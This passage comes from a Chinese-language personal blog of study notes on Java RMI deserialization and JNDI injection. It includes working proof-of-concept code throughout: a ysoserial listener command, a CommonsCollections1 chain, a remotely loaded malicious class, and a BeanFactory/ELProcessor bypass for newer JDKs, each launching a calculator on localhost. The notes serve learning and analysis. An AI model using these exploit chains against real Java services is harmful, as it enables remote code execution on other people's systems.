constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h4><p>主要是在 <code>unmarshalValue()</code> 那个地方存在入口类</p>
<h5 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h5><p>对注册中心来说，有5个方法可以触发，除了unbind和rebind都会返回数据，返回的都是序列化的格式，所以会有客户端反序列化流程，如果我们控制注册中心给客户端发送的数据是恶意的，就能实现对客户端的攻击，这里直接用链子打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;open -a calculator&#x27;</span><br></pre></td></tr></table></figure>

<p>直接起一个1099服务，然后客户端执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">registry.list()</span><br></pre></td></tr></table></figure>

<p>就会弹计算机</p>
<h5 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h5><h6 id="服务端返回恶意Object"><a href="#服务端返回恶意Object" class="headerlink" title="服务端返回恶意Object"></a>服务端返回恶意Object</h6><p>远程方法调用的时候返回的数据除了String，还可以是Object，如果是Object就会有反序列化流程，所以操作空间在这里，现在伪造一个恶意的服务端，当被客户端调用的时候返回恶意Object</p>
<p>新建一个User接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口实现，里面getUser方法返回一个恶意对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerReturnObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">User</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServerReturnObject</span><span class="params">(String name, <span class="type">int</span> age)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端启动，把恶意对象绑定到注册中心</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClassServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">liming</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerReturnObject</span>(<span class="string">&quot;flow&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;user&quot;</span>,liming);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;registry is running...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;liming is bind in registry&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端请求恶意方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务端打客户端，返回 Object 对象  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EVIlClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User)registry.lookup(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机</p>
<h6 id="加载远程对象"><a href="#加载远程对象" class="headerlink" title="加载远程对象"></a>加载远程对象</h6><p>这部分利用条件太苛刻，不细看了</p>
<h4 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h4><p>这块不是很清晰，先略</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>有些地方还不是很清晰，总体就是利用返回数据要反序列化这个点打，或者注册中心的几个方法，看起来有些手法已经过时或者太苛刻了，可学性不高。</p>
<p>匆匆写下这些，其实还不够全，后面再补上，本文内容无法做完知识参考，纯粹个人笔记。如有错误，欢迎指正。</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-jndi注入</title>
    <url>/2025/04/16/Java-jndi%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h3><h4 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h4><p>JNDI全称Java Naming Diretory Interface ，java名称与目录接口，一个名字对应一个对象。他提供了统一的客户端API，由管理者将JNDI API映射为特定的目录服务和命名服务，为使用者查找和访问资源提供了统一的接口，可以用来的定义用户，网络，机器，对象和服务等各种资源。</p>
<p><strong>命名服务</strong>：一个通过名称查找实际对象的服务</p>
<p><strong>目录服务</strong>：目录服务在命名服务基础上扩展，允许为对象添加属性，支持通过属性组合筛选资源。例如，LDAP中用户对象可包含姓名、邮箱等属性。</p>
<p><strong>SPI</strong>（Service Provider Interface）：即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。</p>
<p>JDK 中包含了下述内置的命名目录服务:</p>
<ul>
<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
<li>LDAP: 轻量级目录访问协议</li>
<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
<li>DNS（域名转换协议）</li>
</ul>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">MyService</span> <span class="variable">service</span> <span class="operator">=</span> (MyService) ctx.lookup(<span class="string">&quot;rmi://server/MyService&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="JNDI攻击"><a href="#JNDI攻击" class="headerlink" title="JNDI攻击"></a>JNDI攻击</h3><h4 id="JNDI结合RMI"><a href="#JNDI结合RMI" class="headerlink" title="JNDI结合RMI"></a>JNDI结合RMI</h4><p>在之前RMI项目基础上，客户端和服务端分别新建两个文件</p>
<p>JNDIRMIServer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(); <span class="comment">// 创建JNDI的初始上下文</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 在本地1099起一个RMI注册中心</span></span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>()); <span class="comment">// 用rebind把RemoteObjImpl实例绑定到RMI的remoteObj</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JNDIRMIClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(); <span class="comment">// 创建JNDI的初始上下文</span></span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>); <span class="comment">// 找到这个rmi远程对象</span></span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>)); <span class="comment">// 调用这个方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就能实现远程方法的调用，看起来很RMI很像，主要就是多了<code>InitialContext</code></p>
<h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>打个断点在客户端的lookup调试一下，看整个过程</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214159.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214228.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214302.png" ></p>
<p>流程是<code>InitialContext.lookup()</code>-&gt;<code>GenericURLContext.lookup()</code>-&gt;<code>RegistryContext.lookup()</code>最后在RegistryContext的时候，可以看到<code>this.registry</code>是RegistryImpl_Stub，这个之前已经分析过，所以可以说使用JNDI调用RMI服务的时候，最后还是会走到RMI到逻辑里，使用RMI有的漏洞JNDI也可以打</p>
<h5 id="常见打法jndi-reference"><a href="#常见打法jndi-reference" class="headerlink" title="常见打法jndi reference"></a>常见打法jndi reference</h5><p>jndi注入漏洞，和调用的服务无关，rmi，ldap，dns等都存在这个问题</p>
<p>主要是服务端调用了一个<code>Reference</code>，感觉像套了一层</p>
<p>看一下Reference的构造函数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416231345.png" ></p>
<p>第一个参数是类名，第二个参数是factory工厂（里面有代码逻辑），第三个参数是地址</p>
<p>先写一个恶意类生产class文件，然后在目录起一个http服务，让calc.class文件可以被访问到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 正常启动注册中心</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://localhost:8000/&quot;</span>); </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原来是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());</span><br></pre></td></tr></table></figure>

<p>现在把<code>new RemoteObjImpl()</code>改成<code>reference</code>，感觉就像一层恶意的壳</p>
<p>现在再运行客户端，就成功弹计算机，再调试一下，看看怎么回事</p>
<p>比较特殊的是进到<code>ResitryContext</code>里面有lookup，出来后下面有个<code>decodeObject()</code>，此时有个var2参数是<code>ReferenceWrapper_Stub</code>类型，是lookup返回的内容，也就是在rmi查询到的对象，但是服务端绑定的是Reference对象</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-04-16%2023.27.13.png" ></p>
<p>所以会产生这个变化是因为服务端的<code>rebind()</code>，调试看一下，断点打在服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br></pre></td></tr></table></figure>

<p>跟到<code>RegistryContext.rebind()</code>，里面有<code>this.registry.rebind()</code>，传进去的参数中var2被<code>encodeObject()</code>处理了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233311.png" ></p>
<p>里面就把var1强制转换类型成<code>ReferenceWrapper</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233353.png" ></p>
<p>继续回到客户端，就是有个<code>decodeObject()</code>刚好对应，里面有一个判断把ReferenceWrapper转换会Rederence</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233819.png" ></p>
<p>然后重点在后面进入<code>getObjectInstance()</code>一直到后面<code>getObjectFactoryFromReference()</code>，用这个方法调用reference里面的factory</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234126.png" ></p>
<p>此时已经可以知道factory叫Calc</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234304.png" ></p>
<p>进到里面执行了类加载，用的loadClass，联系到之前类加载的URLClassloader，一直走到newInstance这一步弹出计算机</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234858.png" ></p>
<p>所以最后导致代码被利用的是<code>NamingManager</code>这个类，这意味着我们的容器如果是别的格式的也是可以实现利用的</p>
<h4 id="JNDI结合LDAP"><a href="#JNDI结合LDAP" class="headerlink" title="JNDI结合LDAP"></a>JNDI结合LDAP</h4><p>之前通常是在域环境遇到ldap，</p>
<blockquote>
<p><em>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</em></p>
</blockquote>
<p>起一个ldap服务</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417002139.png" ></p>
<p>然后服务端修改代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&quot;</span>, reference);</span><br></pre></td></tr></table></figure>

<p>再看就已经成功绑定上了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417002233.png" ></p>
<p>然后再用客户端直接去lookup就行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机</p>
<p>也是跟进去，重点在后面<code>LdapCtx.c_lookup()</code>，里面有一个<code>decodeObject()</code>，算是解出ldap里面存的内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417003158.png" ></p>
<p>走完出来就可以获取到要类加载的具体信息</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417003304.png" ></p>
<p>再走到后面又是<code>getObjectInstance()</code>但是调用的是DirectoryManager类的，流程是差不多的，这个类是漏网之鱼，修复时间比较晚</p>
<h3 id="JNDI攻击高版本绕过"><a href="#JNDI攻击高版本绕过" class="headerlink" title="JNDI攻击高版本绕过"></a>JNDI攻击高版本绕过</h3><p>看一下高版本java修复了什么，这里用8u191</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417212409.png" ></p>
<p>在<code>loadclass()</code>里面多了一个判断，这时候<code>trustURLCodebase</code>是false，所以进不去循环，没办法完成类加载</p>
<h4 id="BeanFactory绕过"><a href="#BeanFactory绕过" class="headerlink" title="BeanFactory绕过"></a>BeanFactory绕过</h4><p>这里限制了用URLClassLoader，那我们思路改成用本地的类加载，<strong>利用本地的恶意类作为Reference factory</strong></p>
<p>也就是说，在服务端本地找到恶意factory作为Reference factory进行攻击，这个恶意factory必须实现<code>javax.naming.spi.ObjectFactory</code>接口，实现这个接口的<code>getObjectInstance()</code>方法</p>
<p>救赎之道就是<code>org.apache.naming.factory.BeanFactory</code>，他满足条件并且存在tomcat8里面，应用面比较广。</p>
<p>先看一下大佬给出的代码再理解吧</p>
<p>JNDIBypassHighJavaClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIBypassHighJavaClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JNDIBypassHighJavaServerRebind</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIBypassHighJavaServerRebind</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)&quot;</span> ));</span><br><span class="line"></span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>, resourceRef);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI服务已启动，等待客户端连接...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我实验用了8u202版本，然后也加入了tomcat8依赖，运行之后就弹计算机了</p>
<p>调试看一下，前面的内容都差不多，走到了<code>NamingManager.getObjectInstance()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419145348.png" ></p>
<p>可以看到现在进入<code>getObjectFactoryFromReference()</code>里面带的reference是“org.apache.naming.factory.BeanFactory”，进到里面的loadclass会进行这个类加载</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419145644.png" ></p>
<p>然后再判断clas（也就是和我们传的factory有关）是否实现了<code>ObjectFactory</code>接口，接着进入<code>newInstance()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419145849.png" ></p>
<p>再到<code>getObjectInstance()</code>里面回先判断obj是不是ResourceRef实例，是的话才能继续走下去</p>
<blockquote>
<p><strong>这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例</strong></p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419150358.png" ></p>
<p>经过一系列操作，loadclass，获取到beanclass是<code>javax.el.ELProcessor</code>，实例化他，然后获取里面<code>forceString</code>的值，也就是我们构造的<code>x=eval</code></p>
<blockquote>
<p>继续往下调试可以看到，查找 <code>forceString</code> 的内容中是否存在”&#x3D;”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，<strong>之前设置的 <code>forceString</code> 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 <code>BeanFactory</code> 类能进行利用的关键点！</strong>之后，就是获取 beanClass 即 <code>javax.el.ELProcessor</code> 类的 eval() 方法并和 x 属性一同缓存到 forced 这个 HashMap 中：</p>
</blockquote>
